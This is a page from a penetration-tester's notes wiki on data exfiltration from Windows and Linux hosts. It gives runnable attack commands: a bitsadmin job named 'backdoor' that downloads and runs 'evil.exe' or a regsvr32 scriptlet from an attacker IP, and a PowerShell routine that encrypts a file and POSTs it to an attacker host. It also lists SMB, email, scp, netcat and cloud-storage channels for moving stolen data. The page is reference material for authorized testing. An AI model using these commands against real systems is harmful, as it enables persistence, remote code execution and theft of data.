# Data Exfiltration

{% hint style="success" %}
Hack Responsibly.

Always ensure you have **explicit** permission to access any computer system **before** using any of the techniques contained in these documents. You accept full responsibility for your actions by applying any knowledge gained here.‌
{% endhint %}

{% hint style="danger" %}
Not much here yet...please feel free to contribute at [my GitHub page](https://github.com/zweilosec/Infosec-Notes).
{% endhint %}

## Exfiltrate Data Using BITS Jobs

{% tabs %}
{% tab title="PowerShell" %}
First, you must import the BitsTransfer PowerShell Module with `Import-Module BitsTransfer`.  After you import the BitsTransfer module, the following cmdlets are available:

* **`Add-BitsFile`** Adds files to a BITS transfer
* **`Complete-BitsTransfer`** Completes a BITS transfer
* **`Get-BitsTransfer`** Gets a BITS transfer
* **`Remove-BitsTransfer`** Stops a BITS transfer
* **`Resume-BitsTransfer`** Resumes a suspended BITS transfer
* **`Set-BitsTransfer`** Configures a BITS transfer job
* **`Start-BitsTransfer`** Creates and starts a BITS transfer job
* **`Suspend-BitsTransfer`** Pauses a BITS transfer job

For example, the following Windows PowerShell command begins a BITS transfer from the local computer to a computer named CLIENT:

```powershell
Start-BitsTransfer -Source file.txt -Destination \\client\share -Priority normal
```

When running Windows PowerShell interactively, the PowerShell window displays the progress of the transfer. The following command uses an abbreviated notation to download a file from a Web site to the local computer:

```powershell
Start-BitsTransfer https://server/dir/myfile.txt C:\docs\myfile.txt
```

Manage BITS with PowerShell - Microsoft:

* [https://learn.microsoft.com/en-us/previous-versions/technet-magazine/ff382721(v=msdn.10)](https://learn.microsoft.com/en-us/previous-versions/technet-magazine/ff382721\(v=msdn.10\))
{% endtab %}

{% tab title="cmd.exe" %}
```
bitsadmin /create backdoor
bitsadmin /addfile backdoor "http://10.10.10.10/evil.exe"  "C:\tmp\evil.exe"

# v1
bitsadmin /SetNotifyCmdLine backdoor C:\tmp\evil.exe NUL
bitsadmin /SetMinRetryDelay "backdoor" 60
bitsadmin /resume backdoor

# v2 - exploit/multi/script/web_delivery
bitsadmin /SetNotifyCmdLine backdoor regsvr32.exe "/s /n /u /i:http://10.10.10.10:8080/FHXSd9.sct scrobj.dll"
bitsadmin /resume backdoor
```
{% endtab %}
{% endtabs %}

## Exfiltrate Data Using FTP

See [this section](privilege-escalation.md#using-ftp) under Privilege Escalation

## Exfiltrate Data Using SMB

{% tabs %}
{% tab title="PowerShell" %}
#### Create an SMB share <a href="#example-1-create-an-smb-share" id="example-1-create-an-smb-share"></a>

```powershell
New-SmbShare -Name "Exfil" -Path "C:\temp" -FullAccess "$Domain\Administrator"
```

This command creates an SMB share named "Exfil" and grants Full Access permissions to "$Domain\\$UserName".

For more about the New-SmbShare PowerShell cmdlet:

* [https://learn.microsoft.com/en-us/powershell/module/smbshare/new-smbshare?view=windowsserver2022-ps](https://learn.microsoft.com/en-us/powershell/module/smbshare/new-smbshare?view=windowsserver2022-ps)
{% endtab %}

{% tab title="cmd.exe" %}

{% endtab %}
{% endtabs %}

See [this section](privilege-escalation.md#smb) under Privilege Escalation for more

## AES Encrypt and HTTP POST with PowerShell

If you set up a web server to accept post requests, you can either AES encrypt or base64 encode your target data and simply send an HTTP request to the server with the data.&#x20;

{% hint style="warning" %}
Warning: SecureString has a maximum length of **65536** characters.  This limits the size of the file that can be sent to about 65kb.
{% endhint %}

Example with AES encrypted payload:

```powershell
function Encrypt-File
{
    param(
        [Parameter(Mandatory=$true)]
        [String]$Path, 
        [Switch]$UTF8
        )
        
    $key = (New-Object System.Text.ASCIIEncoding).GetBytes("usemetodecryptit")
    $securestring = new-object System.Security.SecureString

    [byte[]]$data = Get-Content -Encoding Byte -Path $Path
    #Use the -UTF8 flag if your input file is UTF-8 encoded!
    #There is no simple way to check this in PowerShell unfortunately. Use Notepad if possible.
    if ($UTF8)
    {
        $dataString = [System.Text.Encoding]::UTF8.GetString($data)
    }
    else
    {
        $dataString = [System.Text.Encoding]::Unicode.GetString($data)
    }
   
    foreach ($char in $dataString.toCharArray()) {
          $secureString.AppendChar($char)
    }

    $encrypted = ConvertFrom-SecureString -SecureString $secureString -Key $key

    return $encrypted
}

Invoke-WebRequest -Uri http://www.attacker.host/exfil -Method POST -Body $encryptedData
```

You can also skip the last command to send the web request, and simply print the encoded data to the screen and copy to your other terminal (may create a very long wall of text if the file is large!).&#x20;

To decode the data on the other side simply reverse the process:

```powershell
function Decrypt_file
{
    param(
        [Parameter(Mandatory=$true)]
        [String]
        $encrypted_payload, 
        [String]
        $recovered = "recovered.txt"
        )

    $key = (New-Object System.Text.ASCIIEncoding).GetBytes("usemetodecryptit")
        
    echo $encrypted_payload | ConvertTo-SecureString -key $key | ForEach-Object {[Runtime.InteropServices.Marshal]::PtrToStringBSTR([Runtime.InteropServices.Marshal]::SecureStringToBSTR($_))} > $recovered
}
```

Simply input the `$encrypted_payload` argument with the actual content that was sent in the body of the HTTP request, and you will have your exfiltrated file!

{% hint style="warning" %}
You may need to be cognizant of the character encoding of text files you are trying to send.  If the file decrypts with no errors, but looks like garbage or random chinese characters, then you may need to use the `-UTF8` argument for the `Decrypt_file` function above.  \
\
Output filesize for UTF-8 encoded files may be doubled, due to output being UTF-16le by default.
{% endhint %}

References:

* [https://www.delftstack.com/howto/powershell/powershell-byte-array/](https://www.delftstack.com/howto/powershell/powershell-byte-array/)&#x20;

### Covert to and from Base64 with PowerShell

You can always convert your data or files to be exfiltrated to Base64 text and simply copy and paste this in your terminal (or use bash/PowerShell magic to convert your target data back).  See [this section](privilege-escalation.md#covert-to-and-from-base64-with-powershell) under Privilege Escalation for more information on this technique.

## Send an email with PowerShell

### PowerShell `Send-MailMessage` cmdlet

```powershell
Send-MailMessage -From 'User01 <user01@fabrikam.com>' -To 'User02 <user02@fabrikam.com>', 'User03 <user03@fabrikam.com>' -Subject 'Sending the Attachment' -Body "Forgot to send the attachment. Sending now." -Attachments .\data.csv -Priority High -DeliveryNotificationOption OnSuccess, OnFailure -SmtpServer 'smtp.fabrikam.com'
```

* The **`From`** parameter to specify the message's sender.&#x20;
* The **`To`** parameter specifies the message's recipients.&#x20;
* The **Subject** parameter describes the content of the message.&#x20;
* The **Body** parameter is the content of the message.
* The **`Attachments`** parameter specifies the file in the current directory that is attached to the email message.&#x20;
* The **`Priority`** parameter sets the message to **High** priority.&#x20;
* The **`-DeliveryNotificationOption`** parameter specifies two values, **`OnSuccess`** and **`OnFailure`**. The sender will receive email notifications to confirm the success or failure of the message delivery.&#x20;
* The **`SmtpServer`** parameter sets the SMTP server to **smtp.fabrikam.com**.

According to Microsoft this cmdlet has been deprecated with no replacement.  However, if it is present on the machine it should still work!

* [https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/send-mailmessage?view=powershell-7.2](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/send-mailmessage?view=powershell-7.2)

## Misc

### Web services

* Anon paste sites like Pastebin offer an easy exfiltration channel.&#x20;
* GitHub and other code versioning sites are often permitted in many technical organizations.
* Many common file-storage sites like OneDrive, Dropbox, Google Drive, and Box are often permitted, especially if an organization outsources to shared cloud services.

### File-transfer Programs

In addition to the methods listed above, the following programs can be used to transfer files, provided you have copied the program to the victim machine, and it is not blocked:

* netcat
* socat
* tftp

### SCP

The attacker has to have SSHd running.

```bash
scp <username>@<Attacker_IP>:<directory>/<filename> 
```

### Airgap Exfiltration

* [https://thesecmaster.com/14-popular-air-gapped-data-exfiltration-techniques-used-to-steal-the-data/](https://thesecmaster.com/14-popular-air-gapped-data-exfiltration-techniques-used-to-steal-the-data/)

## References

* [https://azeria-labs.com/data-exfiltration/](https://azeria-labs.com/data-exfiltration/)
* [https://www.pentestpartners.com/security-blog/data-exfiltration-techniques/](https://www.pentestpartners.com/security-blog/data-exfiltration-techniques/)

If you like this content and would like to see more, please consider [buying me a coffee](https://www.buymeacoffee.com/zweilosec)!
